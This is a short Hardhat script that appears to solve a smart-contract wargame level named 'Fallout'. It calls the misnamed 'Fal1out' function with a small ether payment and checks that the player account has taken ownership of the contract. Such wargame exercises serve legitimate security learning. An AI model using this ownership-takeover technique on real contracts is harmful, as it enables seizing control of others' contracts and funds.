const { ethers } = require("hardhat");
const { assert } = require("chai");
const CONTRACT_ADDRESS = "0x440C0fCDC317D69606eabc35C0F676D1a8251Ee1";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Fallout",
    CONTRACT_ADDRESS,
    signer
  );

  // Send the transaction
  try {
    const amount = ethers.utils.parseEther("0.0009");
    const txn = await contract.Fal1out({ value: amount });
    console.log(txn);

    const isOwner = await contract.owner();
    assert.equal(isOwner, PLAYER_ADDRESS);
  } catch (error) {
    console.error("Error while sending transaction:", error);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
